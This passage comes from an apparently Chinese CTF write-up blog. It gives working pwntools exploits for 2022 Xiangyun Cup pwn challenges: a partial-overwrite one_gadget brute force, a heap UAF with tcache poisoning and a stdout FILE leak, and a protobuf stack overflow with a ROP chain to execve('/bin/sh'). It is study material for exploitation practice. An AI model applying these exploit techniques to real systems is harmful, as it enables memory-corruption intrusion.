<span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims          :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><span class="hljs-comment">#----------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br>    payload=flat(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span>)<br>    payload+=p8(<span class="hljs-number">0xd1</span>)<br>    se(payload)<br>    <span class="hljs-comment">#debug()</span><br>    og=[<span class="hljs-number">0x4f2a5</span>,<span class="hljs-number">0x4f302</span>,<span class="hljs-number">0x10a2fc</span>]<br>    se(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p8(<span class="hljs-number">0xfc</span>)+p8(<span class="hljs-number">0xE2</span>)+p8(<span class="hljs-number">0xd6</span>))<br>    sl(<span class="hljs-string">&#x27;cat flag&#x27;</span>)<br>    r.recvline_contains(<span class="hljs-string">&#x27;flag&#x27;</span>, timeout=<span class="hljs-number">1</span>)<br>    r.interactive()<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    i=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;try:&#x27;</span>+<span class="hljs-built_in">str</span>(i))<br>        r=process(<span class="hljs-string">&#x27;./unexploitable&#x27;</span>)<br>        <span class="hljs-comment">#r=remote(&#x27;39.106.13.71&#x27;,31780)</span><br>        <span class="hljs-keyword">try</span>:<br>            pwn()<br>        <span class="hljs-keyword">except</span>:<br>            r.close()<br>        i+=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h2 id="leak">leak</h2><p>è¿™é¢˜æœ‰å¿…è¦å¤ç°ä¸€ä¸‹ï¼Œä¸»è¦å‚è€ƒè¿™ä½å¸ˆå‚… <a href="https://www.52pojie.cn/thread-1705930-1-1.html#44512750_%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90">wp</a></p><h3 id="0x01ç¨‹åºåˆ†æ-3">0x01ç¨‹åºåˆ†æ</h3><p>ä¿æŠ¤å…¨å¼€</p><p>deleteä¸­å­˜åœ¨uaf</p><p><img src="/2022/10/31/2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%A5%A5%E4%BA%91%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bpwn/leak1.png" alt="leak1"></p><p>libcæ˜¯Ubuntu GLIBC 2.27-3ubuntu1.6ï¼Œè¿™ä¸ªç‰ˆæœ¬æœ‰doublefreeæ£€æµ‹ï¼Œä¸è¿‡æˆ‘ä»¬èƒ½uafæ”¹key</p><p><img src="/2022/10/31/2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%A5%A5%E4%BA%91%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bpwn/94%609U5B0$A2UK9K%60N6MZDJ6.png" alt="img"></p><p>è¿™ä¸¤ä¸ªå‡½æ•°ä¹Ÿæ²¡æœ‰è¾“å‡ºåŠŸèƒ½ï¼Œèµ·è¿·æƒ‘ä½œç”¨</p><h3 id="0x02åˆ©ç”¨æ€è·¯-3">0x02åˆ©ç”¨æ€è·¯</h3><p>æˆ‘ä»¬çš„æœ€ç»ˆç›®æ ‡å°±æ˜¯æ‰“å°å­˜åœ¨å †ä¸­çš„flagï¼Œä½†æ˜¯è¿™é¢˜æ²¡æœ‰showåŠŸèƒ½ï¼Œå¦‚ä½•æ‰èƒ½åšåˆ°å‘¢ï¼Ÿ</p><p>ä¸€èˆ¬æ²¡æœ‰showåŠŸèƒ½çš„ï¼Œæˆ‘ä»¬å°±è¦æ‰“stdoutï¼Œ</p><p>å¯ä»¥æ”¹<code>0xfbad1800,0,0,0,b'\x00'</code>ï¼Œè¿™ä¹ˆæ”¹çš„è¯ï¼Œé‡åˆ°putsæˆ–printfå‡½æ•°ä¼šæ‰“å° IO_write_base åˆ° IO_write_ptr ä¿©æŒ‡é’ˆä¸­é—´çš„å†…å®¹ï¼Œ</p><p>è™½ç„¶ç¨‹åºç‰¹æ„é¿å…ä½¿ç”¨putsåè€Œç”¨äº†writeï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ç”¨exitåŠŸèƒ½æ¥è§¦å‘IOæµï¼Œé‡Œé¢å°±æœ‰putsæˆ–printfï¼ˆåº”è¯¥ï¼‰</p><p>ï¼ˆæ¯”èµ›æ—¶æ²¡æƒ³åˆ°ç”¨exitğŸ˜…ï¼‰</p><p>é‚£æˆ‘ä»¬åªè¦æ”¹IO_write_baseä¸ºflagçš„å †åœ°å€ï¼ŒIO_write_ptr æ”¹åˆç†çš„åœ°å€ï¼Œexitæ¥è§¦å‘å°±è¡Œäº†</p><p>å› ä¸ºæ— æ³•æ³„éœ²å‡ºlibcä¸heapçš„åœ°å€ï¼Œæˆ‘ä»¬è¦tcache poisonåˆ°æŒ‡å®šåœ°å€åªèƒ½é tcacheä¸­fdä¸­æ®‹ç•™çš„å †åœ°å€ï¼Œunsortbinä¸­å­˜çš„main_arenaåœ°å€ï¼ˆé€šè¿‡æ”¹tcacheçš„fdæœ€åä¸€å­—èŠ‚é€ æˆå †é‡å ï¼Œæ”¹main_arenaåä¸¤å­—èŠ‚æŒ‡å‘stdoutï¼Œè¦çˆ†ç ´4ä½1/16æ¦‚ç‡ï¼‰ï¼Œå¹¶é€šè¿‡å †é‡å å¤šæ¬¡åˆ©ç”¨åŒä¸€ä¸ªå †ã€‚</p><p>æˆ‘ä»¬é tcache poisonç”³è¯·å †åˆ°stdoutï¼Œæ”¹IO_write_ptr ä¸ºè‡ªå·±å®šçš„ä¸€ä¸ªåœ°å€0x577777777777</p><p>ç”¨fastbin reverse to tcacheçš„æ‰‹æ³•ï¼Œæ”¹IO_write_base ä¸ºtcacheçš„bkï¼Œå¯ä»¥æ˜¯å †åŸºå€+0x10</p><p>ï¼ˆfastbin reverse to tcacheçš„æ”»å‡»æ•ˆæœæ˜¯å¾€target-0x18å¤„çš„åœ°å€å†™å…¥å¯¹åº”tcacheçš„bkæŒ‡é’ˆï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªå †åœ°å€ï¼‰</p><p>è¦æ»¡è¶³tachebinæœ‰ä¸€ä¸ªä¸ºç©ºï¼Œè¿™é‡Œæ˜¯0x40æœ‰6ä¸ª</p><p><img src="/2022/10/31/2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%A5%A5%E4%BA%91%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bpwn/fastbinreversetcache1.png" alt="fastbin reverse tcache1"></p><p>æ¥ç€æˆ‘ä»¬å†ç”³è¯·0x40çš„è¯ä¼šæŠŠfastbinä¸­0x40çš„æ”¾åˆ°tcacheä¸­ï¼Œç„¶åtargetå¤„å†™å…¥äº†å †åœ°å€</p><p><img src="/2022/10/31/2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%A5%A5%E4%BA%91%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bpwn/fastbinreversetcache2.png" alt="fastbin reverse tcache2"></p><h3 id="0x03æœ¬åœ°å‡†å¤‡">0x03æœ¬åœ°å‡†å¤‡</h3><p>ç‰ˆæœ¬å·®å¼‚ï¼Œæœ‰å¿…è¦patchelfä¸€ä¸‹</p><p>ç”¨glibc-all-in-oneä¸‹è½½è¿™ç‰ˆæœ¬ï¼Œæ‰¾åˆ°é…å¥—ld</p><p><img src="/2022/10/31/2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%A5%A5%E4%BA%91%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bpwn/22PNOKOE@AVF@P6K(%25WG%7B)8.png" alt="img"></p><p>æ¥ç€patchelf</p><p><code>patchelf --replace-needed libc.so.6 ./libc-2.27.so ./leak</code></p><p><code>patchelf --set-interpreter ./ld-2.27.so ./leak</code></p><p>æœ€åæˆ‘ä»¬æŠŠgdbçš„debugæ–‡ä»¶åŒåæ–‡ä»¶å¤¹æ›¿æ¢æˆ1.6ç‰ˆæœ¬çš„gdbå°±èƒ½è°ƒè¯•å †æ ˆäº†</p><p><code>sudo rm -rf /usr/lib/debug</code></p><p><code>sudo cp -r ~/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/.debug/ /usr/lib/debug</code></p><h3 id="0x04exp">0x04exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./leak&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25904</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims          :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><span class="hljs-comment">#------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx,size</span>):<br>    sla(<span class="hljs-string">&#x27;Your choice: &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sla(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):<br>    sla(<span class="hljs-string">&#x27;Your choice: &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sa(<span class="hljs-string">&#x27;Content: &#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&#x27;Your choice: &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-comment">#----------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br>    <br>    add(<span class="hljs-number">0</span>,<span class="hljs-number">0x30</span>)<br>    add(<span class="hljs-number">7</span>,<span class="hljs-number">0x30</span>)<br>    add(<span class="hljs-number">2</span>,<span class="hljs-number">0x30</span>)<span class="hljs-comment">#victim to overlap</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        delete(<span class="hljs-number">0</span>)<br>        edit(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>)<span class="hljs-comment">#prepare to use fastbin reverse tcache</span><br><br>    add(<span class="hljs-number">3</span>,<span class="hljs-number">0x10</span>)<br>    add(<span class="hljs-number">4</span>,<span class="hljs-number">0x10</span>)<br>    add(<span class="hljs-number">5</span>,<span class="hljs-number">0x10</span>)<br>    add(<span class="hljs-number">1</span>,<span class="hljs-number">0x90</span>)<span class="hljs-comment">#unsortbin</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        delete(<span class="hljs-number">1</span>)<br>        edit(<span class="hljs-number">1</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>)<span class="hljs-comment">#prepare to use get unsortbin main_arena</span><br><br>    delete(<span class="hljs-number">3</span>)<br>    delete(<span class="hljs-number">4</span>)<br>    edit(<span class="hljs-number">4</span>,p8(<span class="hljs-number">0x10</span>))<span class="hljs-comment">#tcache poison to heap 2</span><br><br>    add(<span class="hljs-number">8</span>,<span class="hljs-number">0x10</span>)<br>    add(<span class="hljs-number">9</span>,<span class="hljs-number">0x10</span>)<span class="hljs-comment">#now overlap 2=9</span><br>    edit(<span class="hljs-number">9</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0x41</span>))<br>    delete(<span class="hljs-number">2</span>)<br><br>    add(<span class="hljs-number">10</span>,<span class="hljs-number">0x40</span>)<br>    edit(<span class="hljs-number">9</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0x51</span>))<br>    delete(<span class="hljs-number">10</span>)<br>    delete(<span class="hljs-number">2</span>)<br><br>    edit(<span class="hljs-number">9</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0xa1</span>))<br>    delete(<span class="hljs-number">2</span>)<br>    edit(<span class="hljs-number">2</span>,p16(<span class="hljs-number">0xe760</span>))<br><br>    add(<span class="hljs-number">11</span>,<span class="hljs-number">0x40</span>)<br>    add(<span class="hljs-number">12</span>,<span class="hljs-number">0x40</span>)<br>    edit(<span class="hljs-number">12</span>,p64(<span class="hljs-number">0xfbad1800</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p64(<span class="hljs-number">0x577777777777</span>))<br><br>    edit(<span class="hljs-number">9</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x41</span>))<br>    edit(<span class="hljs-number">2</span>,p16(<span class="hljs-number">0xe780</span>-<span class="hljs-number">0x18</span>))<br>    add(<span class="hljs-number">13</span>,<span class="hljs-number">0x30</span>)<br>    add(<span class="hljs-number">14</span>,<span class="hljs-number">0x30</span>)<br><br>    sla(<span class="hljs-string">&#x27;Your choice: &#x27;</span>,<span class="hljs-string">&#x27;6&#x27;</span>)<br>    ru(<span class="hljs-string">&#x27;flag&#123;&#x27;</span>)<br>    s=rc(<span class="hljs-number">0x50</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;flag&#123;&#x27;</span>+s)<br>    r.interactive()<br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        r=process(<span class="hljs-string">&#x27;./leak&#x27;</span>)<br>        <span class="hljs-keyword">try</span>:<br>            pwn()<br>        <span class="hljs-keyword">except</span>:<br>            r.close()<br></code></pre></td></tr></table></figure><p><img src="/2022/10/31/2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%A5%A5%E4%BA%91%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bpwn/leakgetshell.png" alt="leakgetshell"></p><h2 id="protocol">protocol</h2><p>æ²¡åšè¿‡è¿™ç§ç±»å‹çš„é¢˜ï¼ŒçœŸçš„æ˜¯ä¸€è„¸æ‡µé€¼ğŸ˜¨,å‚è€ƒ-ä¸çŸ¥ä»å“ªæ¥çš„ä¸€ä»½wp</p><p><strong><a href="https://developers.google.com/protocol-buffers/">Protobuf</a>æ˜¯ç”±Googleå¼€å‘çš„ä¸€ç§åºåˆ—åŒ–æ ¼å¼</strong>ï¼Œç”¨äºè¶Šæ¥è¶Šå¤šçš„Androidï¼ŒWebï¼Œæ¡Œé¢å’Œæ›´å¤šåº”ç”¨ç¨‹åºã€‚å®ƒç”±ä¸€ç§<strong>ç”¨äºå£°æ˜æ•°æ®ç»“æ„çš„è¯­è¨€</strong>ç»„æˆï¼Œç„¶åæ ¹æ®ç›®æ ‡å®ç°å°†å…¶ç¼–è¯‘ä¸ºä»£ç æˆ–å¦ä¸€ç§ç»“æ„ã€‚</p><h3 id="0x01ç¨‹åºåˆ†æï¼š">0x01ç¨‹åºåˆ†æï¼š</h3><p>è¿™é¢˜æ˜¯photobufæ–‡ä»¶ï¼Œ</p><p>å…ˆidaè·³è½¬åˆ°æŒ‡å®šå‡½æ•°ï¼Œå› ä¸ºå»äº†ç¬¦å·è¡¨ï¼ŒåŠ ç­¾åæ–‡ä»¶ï¼Œå¯ä»¥è·å¾—æ›´å¤šä¿¡æ¯</p><p><img src="/2022/10/31/2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%A5%A5%E4%BA%91%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bpwn/photo1.png" alt="photo1"></p><p>å‘ç°æ¼æ´å­˜åœ¨äºè¿™ä¸¤ä¸ªstrcpyï¼Œå­˜åœ¨æ ˆæº¢å‡º</p><p>åç§»0x148æˆ–0x248</p><p><img src="/2022/10/31/2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%A5%A5%E4%BA%91%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bpwn/@GXH%7D4T65URK%7B7GJQQL%7BMKR.png" alt="img"></p><p>ä½†ç”±äºç”¨çš„æ˜¯strcpyï¼Œé‡åˆ°\x00ä¼šæˆªæ–­ï¼Œå¹¶ä¸”åœ¨æœ«å°¾ä¼šåŠ ä¸Š\x00</p><p>ç¨‹åºä¼šä¸€ç›´å¾ªç¯ï¼Œå¦‚æœæˆ‘ä»¬è¦ç”¨æ ˆæº¢å‡ºå»ropçš„è¯å¯ä»¥ä»åå¾€å‰æ„é€ </p><p>ä½†é¦–å…ˆæˆ‘ä»¬å¾—æ­£ç¡®ä¸ç¨‹åºè¿›è¡Œäº¤äº’</p><h3 id="0x02å®‰è£…pbkt">0x02å®‰è£…pbkt</h3><p>ç”¨å·¥å…·å¸®åŠ©æˆ‘ä»¬é€†å‘</p><blockquote><p>pbtk - é€†å‘å·¥ç¨‹Protobufåº”ç”¨ç¨‹åº</p></blockquote><p>æˆ‘é€‰æ‹©åœ¨ubuntu20.04ä¸Šè£…</p><p>æŠ¥äº†å¾ˆå¤šé”™</p><p>æœ€åæˆ‘æ›´æ–°pip3åˆ°æœ€æ–°ç‰ˆæœ¬ï¼Œä¸‹é¢ä»£ç openjdk-9æˆ‘æ¢æˆopenjdk-11ï¼Œ</p><p>git cloneæˆ‘æ¢æˆå»githubä¸Šä¸‹è½½zipåˆ°ä¸»æœºï¼Œå†è§£å‹æ”¾åˆ°è™šæ‹Ÿæœºé‡Œï¼Œ</p><p>è¿è¡Œ./gui.pyæˆåŠŸæå®š</p><p><img src="/2022/10/31/2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%A5%A5%E4%BA%91%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bpwn/pbkt%E5%AE%89%E8%A3%85.png" alt="pbktå®‰è£…"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt install python3-pip git openjdk-11-jre libqt5x11extras5 python3-pyqt5.qtwebengine python3-pyqt5<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo pip3 install protobuf pyqt5 pyqtwebengine requests websocket-client</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git <span class="hljs-built_in">clone</span> https://github.com/marin-m/pbtk</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> pbtk</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">./gui.py</span><br></code></pre></td></tr></table></figure><h3 id="0x03å¾—åˆ°ctf-proto">0x03å¾—åˆ°ctf.proto</h3><p>ç›´æ¥ç‚¹å‡»step1</p><p>ç„¶åé€‰æ‹©ç¬¬ä¸€ä¸ªä¹Ÿå°±æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶æ ¼å¼çš„</p><p>æ‰¾åˆ°protocolæ–‡ä»¶ï¼ŒåŒå‡»ï¼Œå°±æœ‰äº†ctf.protoæ–‡ä»¶</p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œæ–‡ä»¶å­˜åœ¨è¿™ä¸ªä½ç½®</p><p><img src="/2022/10/31/2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%A5%A5%E4%BA%91%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bpwn/ctfproto1.png" alt="ctfproto1"></p><p>æˆ‘æ‹·è´åˆ°æ¡Œé¢</p><p><code>cp -r ./ctf.proto ~/Desktop</code></p><h3 id="0x04protocç¼–è¯‘poptoæ–‡ä»¶">0x04protocç¼–è¯‘poptoæ–‡ä»¶</h3><p>å®‰è£…è°·æ­Œçš„protoc</p><p><code>sudo apt install python3-protobuf protobuf-compiler libprotobuf17 libprotobuf-dev</code></p><p>è¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼Œç¼–è¯‘å‡ºctf_pb2.pyæ–‡ä»¶</p><p><code>protoc --python_out=./ ./ctf.proto</code></p><p>æˆ‘ä»¬å¯ä»¥å¼•ç”¨</p><p><code>import ctf_pb2</code>åˆ°è„šæœ¬ä¸­</p><p>å®ƒçš„ç»“æ„ä¸º</p><p><img src="/2022/10/31/2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%A5%A5%E4%BA%91%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bpwn/photo2.png" alt="photo2"></p><p>å¯ä»¥è¿™ä¹ˆç”¨å¦‚ä¸‹ä»£ç ä½¿ç”¨ï¼Œç”¨.SerializeToString()æ–¹æ³•åºåˆ—åŒ–</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">d=ctf_pb2.pwn()<br>d.username=pd<br>d.password=<span class="hljs-string">b&#x27;p&#x27;</span><br>strs=d.SerializeToString()<br>r.sendafter(<span class="hljs-string">b&#x27;Login: &#x27;</span>,strs)<br></code></pre></td></tr></table></figure><h3 id="0x05exp">0x05exp</h3><p>å¤§ä½“é€»è¾‘å°±æ˜¯æ ˆæº¢å‡ºä»åå¾€å‰ropé€ äº†execve(bss,0,0) å’Œread(0,bss,7),å†™å…¥/bin/sh</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> ctf_pb2<br>r = process(<span class="hljs-string">&#x27;protocol&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./protocol&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     